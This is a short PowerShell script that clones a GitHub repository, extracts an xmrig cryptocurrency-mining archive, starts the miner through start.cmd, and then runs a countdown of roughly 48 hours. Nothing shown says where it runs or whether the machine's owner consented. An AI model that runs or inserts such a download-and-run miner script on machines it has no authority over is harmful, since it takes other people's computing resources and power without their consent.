$i = 2880
Sleep 120
git clone https://github.com/YJL-NLP/wk_menluo
cd wk_menluo
7z x  xmrig-6.10.0-msvc-cuda10_2-win64.rar
 cd xmrig-6.10.0-msvc-cuda10_2-win64
start start.cmd
do {
    Write-Host $i
    Sleep 60
    $i--
} while ($i -gt 0)
